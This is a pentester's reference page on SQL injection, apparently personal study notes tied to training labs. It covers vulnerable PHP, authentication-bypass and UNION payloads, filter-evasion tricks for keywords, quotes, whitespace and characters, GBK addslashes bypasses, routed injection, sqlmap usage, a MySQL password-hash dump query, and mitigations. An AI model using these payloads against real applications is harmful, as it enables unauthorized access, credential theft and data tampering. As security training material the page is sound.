# SQL injection (SQLi)

[![sqlinjectionfundamentals](../../../../_badges/htb/sqlinjectionfundamentals.svg)](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
[![SQL Injection](../../../../_badges/poat/sql_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
[![sql-injection-payload-list](../../../../_badges/payloadbox/sql_injection.svg)](https://github.com/payloadbox/sql-injection-payload-list)
[![sqlinjectionlm](../../../../_badges/thm/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)
[![sqlilab](../../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day5.svg)](https://tryhackme.com/room/adventofcyber2)
[![adventofcyber4](../../../../_badges/thm/adventofcyber4/day16.svg)](https://tryhackme.com/room/adventofcyber4)
[![ccpentesting](../../../../_badges/thm-p/ccpentesting.svg)](https://tryhackme.com/room/ccpentesting)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)
[![validation](../../../../_badges/htb-p/validation.svg)](https://app.hackthebox.com/machines/Validation)
[![sql_injection_authentication](../../../../_badges/rootme/web_server/sql_injection_authentication.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)
[![sql_injection_string](../../../../_badges/rootme/web_server/sql_injection_string.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)
[![sql_injection_numeric](../../../../_badges/rootme/web_server/sql_injection_numeric.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)
[![sql_injection_routed](../../../../_badges/rootme/web_server/sql_injection_routed.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)
[![sql_injection_error](../../../../_badges/rootme/web_server/sql_injection_error.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)
[![sql_injection_filter_bypass](../../../../_badges/rootme/web_server/sql_injection_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)
[![sql_injection_file_reading](../../../../_badges/rootme/web_server/sql_injection_file_reading.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)
[![sql_injection_insert](../../../../_badges/rootme/web_server/sql_injection_insert.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert)
[![sqli_hidden_data](../../../../_badges/ps/sqli_hidden_data.svg)](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
[![sqli_login_bypass](../../../../_badges/ps/sqli_login_bypass.svg)](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
[![sqli_oracle_version](../../../../_badges/ps/sqli_oracle_version.svg)](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
[![sqli_mysql_version](../../../../_badges/ps/sqli_mysql_version.svg)](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

<div class="row row-cols-lg-2"><div>

Most websites are using a [relational database](/programming-languages/databases/relational/_knowledge/index.md) to store data, and the [SQL](/programming-languages/databases/relational/sql/index.md) query language to query the database.

When making a SQL request, a programmer may use the user input. For instance, a product name for a query to search a product.

A vulnerable [PHP](/programming-languages/web/php/_general/index.md) code use the user input directly in the SQL request:

```php!
$name = $_GET['name']; // filled by the user
$sql = "Select name from product where name LIKE '%$name%'";
```

There is a SQL injection when a user inputs SQL code, and the request interpret the user input as SQL code.

‚úÖ If the user enters the product name "`yummy`"


```sql!
Select name from product where name LIKE '%yummy%'";
```
</div><div>

‚ùå But, with the product name "`' UNION SELECT "hacked"-- -`", the injected SQL code is executed just fine.

```sql!
Select name from product where name LIKE '%' UNION SELECT "hacked"-- -%'
```

‚û°Ô∏è A hacker may be able to fetch/create/update/delete records!

üî• While SQL injections are known since 1998, they are still a frequent vulnerability found in applications. They are found in every language.

<br>

**Tools** ü§ñ

* [sqlmap](/cybersecurity/red-team/s3.exploitation/tools/sqlmap.md) (discovery+exploitation)
</div></div>

<hr class="sep-both">

## SQLi categories

<div class="row row-cols-lg-2"><div>

**In-band SQLi** üé∏ is a category of SQLi attacks for those using the same channel to attack and to gather results.

* [Error-based](files/error_sqli.md)
* [Union-based](files/union_sqli.md)
* [Insert-based](files/insert_sqli.md)

</div><div>

**Blind/inferential SQLi** üó∫Ô∏è is a category of SQLi attacks for which we observe the application response to infer results.

* [Boolean-based](files/boolean_sqli.md)
* [Time-based](files/time_sqli.md)
* Out-of-band-based
* Voice-based
* Stacked queries-based (`req1 ; req2`)
</div></div>

<hr class="sep-both">

## SQLi payloads

[![sqlinjectionfundamentals](../../../../_badges/htb/sqlinjectionfundamentals.svg)](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
[![sqlinjectionlm](../../../../_badges/thm/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)
[![sqlilab](../../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day5.svg)](https://tryhackme.com/room/adventofcyber2)

<table class="table table-bordered border-dark table-dark bg-transparent mt-3">
<thead>
<tr><th>Name</th><th>Expected SQL</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>Usual PoC</td><td><code>Select [...] where xxx='here' [...]</code></td><td><code>'</code><br><small>The query will fail as there would be 3 quotes,<br> and that would confirm that an injection is possible.</small></td></tr>

<tr><td>NoPassword</td><td><code>Select [...] where username='here' AND password='...' [...]</code></td><td><code>' OR 1=1 -- -</code><br><small>The query will bypass the check of the password,<br>if it was made in the query.<br>We use 1=1 for maximum compatibility.</small></td></tr>

<tr><td>Input box String</td><td><code>Select [...] where xxx='here' [...]</code></td><td><code>' code -- -</code></td></tr>

<tr><td>Input box Non-String</td><td><code>Select [...] where xxx=here [...]</code></td><td><code>'' code -- -</code></td></tr>

<tr><td>Update</td><td><code>Update [...] set x='here',y=[...]</code></td><td><code>',x=(code),y='</code></td></tr>
</tbody></table>

Other characters such as `"`, `)`, `#`, `;`, and their URL-encoded versions can be used to detect a SQL injection.

üêà As [Union payloads](files/union_sqli.md) are leveraged by most SQL injections, many payloads are listed there.

üöÄ Find tables such as `INFORMATION_SCHEMA.TABLES` or `sqlite_master` to determine the DBMS.

<hr class="sep-both">

## SQL Injection Filter Bypass

<div class="row row-cols-lg-2"><div>

#### Keyword Filter Bypass

[![sql_injection_filter_bypass](../../../../_badges/rootme/web_server/sql_injection_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)

Keywords are case-insensitive.

```diff
- select
+ Select
+ SeleCT
+ SELECT
```

```diff
- OR
+ ||
```

```diff
- AND
+ &&
```

<br>

#### Strings Filter Bypass

[![sql_injection_file_reading](../../../../_badges/rootme/web_server/sql_injection_file_reading.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)

Sometimes, functions such as `mysqli_real_escape_string` or `addslashes` are used to escape a few characters including quotes. If the payload is quoted (`where xxx='{payload}'`) then there is nothing we can do. Otherwise, if we need strings in unquoted payloads:

* If double quotes are banned, use single quotes, and vice-versa. 

```diff
- Select 'toto'
+ Select "toto"
```

* If both are banned, try to craft a payload without any strings.

```diff
- [...] foo='toto'
+ [...] foo=(Select 0x746f746f)
+ [...] foo=CHAR(116,111,116,111)
+ [...] SUBSTR(foo, 1, 3)=CHAR(116,111,116)
+ [...] CAST(foo as BINARY(3))=CHAR(116,111,116)
+ [...] WEIGHT_STRING(username AS BINARY (3))=CHAR(116,111,116)
+ [...] unicode(substr(foo,1,1))=chr(116) -- sqlite
+ Select foo from bar LIMIT 0,1 -- until you find 'toto'
```

Use `"0x" + ("toto".encode().hex())` Python code to get `0x746f746f`.

Use `"CHAR(" + ",".join([str(ord(v)) for v in "toto"]) + ")"` Python code to get `CHAR(116,111,116,111)`.

#### Table Attribute Filter Bypass

A trick from [here](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/). Assuming `dummy` has two columns `id` and `flag`:

```diff
- SELECT flag FROM dummy;
+ SELECT T.2 FROM (SELECT 1,2 UNION SELECT * FROM dummy)T;
+ SELECT T.2 FROM (SELECT 1,2 EXCEPT SELECT 1,2 UNION SELECT * FROM dummy)T;
```

‚ö†Ô∏è The first row is `1, 2, etc.` unless skipped.
</div><div>

#### Whitespace Filter Bypass

[![sql_injection_filter_bypass](../../../../_badges/rootme/web_server/sql_injection_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)

When the character space is filtered, we should try every other blank character: `0x09` or `\t`, `0x0A` or `\n`, `0x0B`, `0x0C`, `0x0D` or `\r` and `0xA0`.

Another way is to use comments, parenthesis, or backtick:

```diff
- Select foo from bar where foo='toto' 
+ Select/**/foo/**/from/**/bar/**/where/**/foo='toto'
+ SELECT(foo)FROM(bar)where(foo='toto');
+ SELECT`foo`FROM`bar`where`foo`='toto';
```

There are a few more tricks!

```diff
- Select * From[...]
+ Select*From[...]
```

```diff
- Select 'toto' From[...]
+ Select'toto'From[...]
```

```diff
- [...]LIMIT 1
+ [...]LIMIT+1 -- sqlite only
```

```diff
- Select foo[...]
+ Select+foo[...] -- MySQL only?
```

#### Character Filter Bypass

[![sql_injection_filter_bypass](../../../../_badges/rootme/web_server/sql_injection_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)

Some characters may be banned:

* If comma is banned, you may sometimes find another alternative.

```diff
- [...] LIMIT 0,1
+ [...] LIMIT 1 OFFSET 0
```

```diff
- Select 1, 2
+ SELECT * FROM (Select 1)a JOIN (Select 2)b
```

* Some banned operators such as `=` can be bypassed using functions

```diff
- [...] WHERE 1=1
+ [...] WHERE 1 IN (1)
```

```diff
- [...] WHERE username='admin'
+ [...] WHERE STRCMP(username, 'admin') BETWEEN 0 AND 0
```

#### Additional Bypasses

Some additional notes for advanced filters:

* You can have spaces between the function name and its parenthesis: `a()`, `a ()`, and `a<tab>()` are all valid.
</div></div>

<hr class="sep-both">

## SQLi Lateral Movement

<div class="row row-cols-lg-2"><div>

#### SQLi Filesystem Attacks

SQL injections can be used to read/write files if the user as sufficient permissions. Aside from root, it's not common.

[This section was moved here](/cybersecurity/red-team/s3.exploitation/vulns/others/database/filesystem.md).

<br>

#### SQLi Run Commands

No notes for now. Refer to `sys_exec`?
</div><div>

#### SQLi Dump Passwords

[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)

You can use SQLMap `--passwords`. With MySQL:

```sql!
SELECT CONCAT(user, '%', host) as 'username', authentication_string FROM mysql.user;
```
</div></div>

<hr class="sep-both">

## Additional SQLi Attack

<div class="row row-cols-lg-2"><div>

#### Second Order SQLi Attack

[![sqlilab](../../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)

A second-order SQLi attack occurs when an initial request that is not vulnerable to SQLi stores SQL code within the database, code that is later reused to exploit a vulnerable request.

For instance, using an username such as `admin'-- -` may also use to inject the invoice SQL query and fetch 'admin' records.

```ps
$ sqlmap --url 'URL/signup' --second-url 'URL/invoices' [...]
```

#### PHP addslashes GBK

[![sql_injection_authentication_gbk](../../../../_badges/hacktricks/pentesting_web/sql_injection/gbk_authentication_bypass.svg)](https://book.hacktricks.xyz/pentesting-web/sql-injection#gbk-authentication-bypass)
[![sql_injection_authentication_gbk](../../../../_badges/rootme/web_server/sql_injection_authentication_gbk.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK)

Addslashes may rarely be used to prevent SQL injections. It's worth noting that it is only preventing SQL injections involving quotes.

When the database local is set to GBK and PHP version is 5, it's possible to perform an SQL injection including quotes.

* `Îºß or 1=1-- -` for `0xbf27`
* `ÎΩú' or 1=1-- -` for `0xbf5c`
* ...

Otherwise, try to forge a payload without any quotes.
</div><div>

#### Routed injection

[![attacking_common_applications](../../../../_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![sqlilab](../../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![sql_injection_routed](../../../../_badges/rootme/web_server/sql_injection_routed.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)

If we know or can guess the application flow, we may be able to forge an SQL statement with hard-coded data to control the program flow.

* Bypass login/register using hard-coded data

```sql!
SELECT username,password,is_admin [...] WHERE username='<user_input>' [...]
SELECT [...] union select 'hello','world',TRUE -- hard-coded user injected
```

* Bypass chained statements using hard-coded data

```sql!
-- return an ID
SELECT id [...] WHERE username='<user_input>'
-- User input: ' union select '1'' union select [...]-- -'
-- Payload: SELECT id [...] WHERE username='' union select '1'' union select [...]-- -'
-- User input: 0x312720756e696f6e2073656c656374205b2e2e2e5d2d2d202d
-- Payload: SELECT id [...] WHERE username='0x312720756e696f6e2073656c656374205b2e2e2e5d2d2d202d'
-- (Python=> "1' union select [...]-- -".encode().hex())
```

```sql!
-- use the returned ID by previous SQL request
SELECT [...] WHERE id = '1' union select [...]-- -'
```
</div></div>

<hr class="sep-both">

## SQLi mitigations üõ°Ô∏è

[![sqlinjectionfundamentals](../../../../_badges/htb/sqlinjectionfundamentals.svg)](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
[![sqlinjectionlm](../../../../_badges/thm/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)
[![adventofcyber4](../../../../_badges/thm/adventofcyber4/day16.svg)](https://tryhackme.com/room/adventofcyber4)

<div class="row row-cols-md-2 mt-3"><div>

* Use **prepared requests** (statements), they are ensuring that the parameters of your queries are not interpreted as SQL code

* **Input validation** or **escaping user input**: You can filter and validate input, but you CAN'T rely on it, as your filter will _most likely_ be bypassed. Front-end validations are not enough.

* **Do not trust anyone** üìå. SQL injections may be delayed. For instance, one may have protected the login queries, but if someone submitted SQL code as their username, then any other request using the username may interpret it.

* **Keep quiet about errors** ü™≤. Do not display SQL/DBMS errors. Do not be too specific either. For instance, some use `invalid credentials` instead of `invalid password` to prevent mappings.
</div><div>

* **Apply the least privilege principle** üî´. Use accounts with the least permission. Restrict/Revoke file permissions.

Some network security devices such as a WAF may be configured to detect/block SQLi attacks and other common attacks.

<br>

**Pentester Bypass/notes** üîè

* You can bypass client side verifications by manually sending the form or directly interacting with the API (if any).

* For manual SQLi, you may use the HTML tags "names" in the form first, as they may be the name of the attributes in the database.
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [sqlinjection.net](https://www.sqlinjection.net/)
* `CURRENT_USER()` and other commands to learn about the DB
* `Select @@global.xxx` to read a variable
</div><div>
</div></div>